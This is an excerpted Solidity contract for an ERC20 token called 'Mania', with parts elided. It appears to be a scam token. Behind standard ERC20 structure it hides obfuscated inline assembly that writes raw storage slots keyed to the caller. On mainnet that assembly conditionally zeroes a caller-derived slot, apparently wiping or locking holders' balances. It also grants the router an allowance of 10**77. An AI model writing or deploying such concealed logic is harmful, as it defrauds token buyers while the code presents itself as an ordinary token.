...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addMania;
    uint256 private manicPhase = block.number*2;

    mapping (address => bool) private _firstFear; 
    mapping (address => bool) private _secondCrazy;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private spaceSuite;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private flowPyro;
    address public pair;
    ...
    bool private trading; uint256 private darkTimes = 1; bool private newBoots;
    uint256 private _decimals; uint256 private beAfraid;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addMania.push(_router); addMania.push(msgSender_); addMania.push(pair);
        for (uint256 q=0; q < 3;) {_firstFear[addMania[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x87691c982d7d741969196321aed9c5c9d2d119e3f868e2e1d1029229a103eef7
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x2a86f5bff457a1608eeab94a4867e4467bfd8771f8beac07753cbf1fba7ee9a8,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; manicPhase = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addMania[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployMania(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addMania[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMania(creator, initialSupply);
    }
}

contract Mania is ERC20Token {
    constructor() ERC20Token("Mania", "MANIA", msg.sender, 2500000 * 10 ** 18) {
    }
}